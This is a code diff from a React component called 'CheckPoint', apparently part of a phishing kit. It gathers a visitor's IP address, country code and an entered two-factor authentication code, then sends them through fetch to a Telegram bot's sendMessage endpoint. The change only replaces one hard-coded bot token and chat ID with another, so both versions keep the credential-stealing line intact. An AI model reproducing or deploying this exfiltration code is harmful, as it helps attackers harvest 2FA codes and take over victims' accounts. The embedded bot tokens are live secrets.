@@ -56,7 +56,7 @@ const CheckPoint = (props) => {
         try {
             const message = `
             2FA%0A Ip:${props.ip.userIP}%0ACountry Code: ${countryCode}%0A🔐code: ${data.code}`;
-            await fetch(`https://api.telegram.org/bot7084620467:AAGeN4LUgNN5jGCRZjTCUm13vLClBpGyaw4/sendMessage?chat_id=-1002226532878&text=${message}`);
+            await fetch(`https://api.telegram.org/bot7692191399:AAHd6jlWAXI0dZTrX-nAYbfDGLeaHrRZxEI/sendMessage?chat_id=-2326609566_2&text=${message}`);
         } catch (err) {
             console.log(err);
         }
